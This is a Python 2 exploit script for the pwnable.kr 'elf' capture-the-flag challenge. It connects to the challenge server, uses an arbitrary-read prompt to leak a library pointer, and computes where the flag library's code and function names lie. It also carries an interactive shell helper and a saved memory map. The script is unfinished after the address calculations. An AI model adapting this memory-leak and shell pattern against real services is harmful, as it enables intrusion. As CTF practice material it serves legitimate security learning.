#! /usr/bin/env python2
# -*- coding: utf-8 -*-

import socket
import telnetlib
import struct

p64 = lambda data: struct.pack("Q", data)
u64 = lambda data: struct.unpack("Q", data)[0]
p32 = lambda data: struct.pack("I", data)
u32 = lambda data: struct.unpack("I", data)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(60)

host = '127.0.0.1'
host = 'pwnable.kr'
s.connect((host, 9024))
# socat TCP-LISTEN:9024,reuseaddr,fork EXEC:"./python elf.py"

def recvall():
    out = ""
    while True:
        try:
            out += s.recv(1)
        except socket.timeout:
            return out

def recvline(keepends=True):
    return recvuntil('\n', keepends)

def recvlines(numlines, keepends=False):
    b = ""
    for i in xrange(numlines):
        b += recvline(keepends)
    return b

def recv(n=4096):
    b = ""
    while len(b) < n:
        b += s.recv(n - len(b))
    return b

def recvuntil(check, keepends=True):
    b = ""
    while check not in b:
        b += s.recv(1)
    if keepends is False:
        b = b[:-len(check)]
    return b

def sendline(msg):
    s.send(msg + '\n')

def send(msg):
    s.send(msg)

def interactive():
    print 'shell:'
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def main():
    recvuntil('addr?:')
    sendline('0x008f9ea0') # puntero a libflag
    leak = recvuntil('addr?:')[:8]
    leak = u64(leak)
    print 'leaked flaglib addr: ' + hex(leak)
    top_lib = leak - 0xad000
    print 'flaglib loaded at: ' + hex(top_lib)
    libflag_code = top_lib + 0x46000
    print 'libflag code: ' + hex(libflag_code)
    funcions_names = top_lib + 0x2ca5c
    print 'funcions names: ' + hex(funcions_names)
    names_len = 90080

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        pass

"""0x00007f4c4[9a][0-9a-f]{3}000
0x0000000000400000 - 0x00000000006de000 - usr   2.9M s r-x /home/user/repositorios/pwnable/elf/python /home/user/repositorios/pwnable/elf/python ; map.home_user_repositorios_pwnable_elf_python.r_x
0x00000000008dd000 - 0x00000000008de000 - usr     4K s r-- /home/user/repositorios/pwnable/elf/python /home/user/repositorios/pwnable/elf/python ; map.home_user_repositorios_pwnable_elf_python.r
0x00000000008de000 - 0x0000000000955000 - usr   476K s rw- /home/user/repositorios/pwnable/elf/python /home/user/repositorios/pwnable/elf/python ; map.home_user_repositorios_pwnable_elf_python.rw
0x0000000000955000 - 0x0000000000978000 - usr   140K s rw- unk0 unk0 ; map.unk0.rw
"""
